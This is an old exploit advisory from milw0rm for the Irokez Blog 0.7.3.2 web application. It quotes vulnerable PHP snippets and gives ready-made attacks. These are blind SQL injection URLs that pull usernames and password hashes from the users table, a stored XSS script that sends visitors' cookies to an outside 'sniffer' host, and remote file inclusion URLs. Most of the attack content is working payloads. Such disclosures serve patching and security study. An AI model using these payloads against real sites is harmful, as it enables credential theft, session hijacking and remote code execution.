<html><head><title>Irokez BLog 0.7.3.2 (XSS/RFI/BSQL) Multiple Remote Vulnerabilities</title></head><pre>================================================================================
|| Irokez Blog BLIND SQL-INJECTION, INCLUDE, ACTIVE XSS
================================================================================

Application: Irokez Blog
------------
Website: http://irokez.org
--------
Version: All (0.7.3.2)
--------
Date: 11-02-2009
-----

[ BLIND SQL-INJECTION ]

[ SOME VULNERABLE CODE ]

/classes/table.class.php

...
if ($is_trans) {
                $query = &quot;select t.*, m.* from {$this-&gt;_name} m&quot;
                       . &quot; left join {$this-&gt;_name}{$this-&gt;_trans} t on (t.{$this-&gt;_item} = m.id)&quot;
                       . &quot; where m.id = '$id' group by {$this-&gt;_lang}&quot;;
        	} else {
                $query = &quot;select * from {$this-&gt;_name} where id = '$id'&quot;;
        	}
            $result = $this-&gt;db-&gt;exeQuery($query);

===&gt;&gt;&gt; Exploit:

http://irokez/blog/life/15' and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1)) between 100 and '115
http://irokez/blog/life/15' and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1))='114
etc

[ ACTIVE XSS ]

in comments.

[ SOME VULNERABLE CODE ]

/scripts/blog/output-post.inc.php

 &lt;input id=&quot;name&quot; type=&quot;text&quot; class=&quot;text&quot; name=&quot;name&quot; value=&quot;&lt;?php echo $name?&gt;&quot; /&gt;
                &lt;label for=&quot;name&quot;&gt;&lt;?php echo $GLOBALS['LANG']['blog']['name']?&gt;&lt;/label&gt;
            &lt;/li&gt;
            &lt;li&gt;
                &lt;input id=&quot;email&quot; type=&quot;text&quot; class=&quot;text&quot; name=&quot;email&quot; value=&quot;&lt;?php echo $email?&gt;&quot; /&gt;
                &lt;label for=&quot;email&quot;&gt;&lt;?php echo $GLOBALS['LANG']['blog']['email']?&gt;&lt;/label&gt;
            &lt;/li&gt;
            &lt;li&gt;
                &lt;input id=&quot;site&quot; type=&quot;text&quot; class=&quot;text&quot; name=&quot;site&quot; value=&quot;&lt;?php echo $site?&gt;&quot; /&gt;
                &lt;label for=&quot;site&quot;&gt;&lt;?php echo $GLOBALS['LANG']['blog']['site']?&gt;&lt;/label&gt;
...
 &lt;textarea id=&quot;message&quot; name=&quot;message&quot; class=&quot;textarea&quot;&gt;&lt;?php echo $message?&gt;&lt;/xtextarea&gt;

===&gt;&gt;&gt; Exploit:

&lt;script&gt;img = new Image(); img.src = &quot;http://sniffer/sniff.jpg?&quot;+document.cookie;&lt;/script&gt;

[ INCLUDE ]

[ SOME VULNERABLE CODE ]

/thumbnail.php
...
ob_start();
switch ($module) {
    case 'gallery':
        include_once $GLOBALS['PTH']['classes'] . 'gallery.class.php';
        $Obj = new TBL_Gallery;
        $image_path = $GLOBALS['PTH']['gallery'] . getVar($Obj-&gt;select($id), 'src');
        break;
    default:
        $image_path = '';
}

===&gt;&gt;&gt; Exploit:

http://irokez/modules/tml/block.tag.php?GLOBALS[PTH][classes]=[include]
http://irokez/scripts/sitemap.scr.php?GLOBALS[PTH][classes]=[include]
http://irokez/thumbnail.php?module=gallery&amp;GLOBALS[PTH][classes]=[include]
http://irokez/spaw/spaw_control.class.php?GLOBALS[spaw_root]=[include]

Author: Eugene &quot;Corwin&quot; Ermakov
-------                                     
	
Contact: corwin88[dog]mail[dot]ru
--------

# milw0rm.com [2009-02-27]</pre></html>